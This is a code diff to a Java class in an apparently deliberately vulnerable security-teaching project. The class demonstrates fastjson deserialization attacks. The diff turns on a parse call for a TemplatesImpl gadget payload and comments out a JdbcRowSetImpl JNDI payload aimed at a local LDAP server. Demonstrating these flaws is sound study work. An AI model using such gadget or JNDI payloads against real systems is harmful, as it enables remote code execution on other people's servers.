@@ -1,4 +1,4 @@
-package com.madaha.codesecone.controller.AdvancedAttack.deserialize.components;
+package com.madaha.codesecone.controller.AdvancedAttack.deserialize;
 
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONObject;
@@ -55,7 +55,7 @@ public class FastJson {
                 "    '_tfactory': {},\n" +
                 "    \"_outputProperties\": {},\n" +
                 "}";
-//        JSON.parseObject(payload, Feature.SupportNonPublicField);
+        JSON.parseObject(payload, Feature.SupportNonPublicField);
 
         /**
          * Open calc in windows：
@@ -71,6 +71,6 @@ public class FastJson {
                 "    \"dataSourceName\": \"ldap://127.0.0.1:1389/m6llip\",\n" +
                 "    \"autoCommit\": true\n" +
                 "}";
-        JSON.parse(PoC);
+//        JSON.parse(PoC);
     }
 }
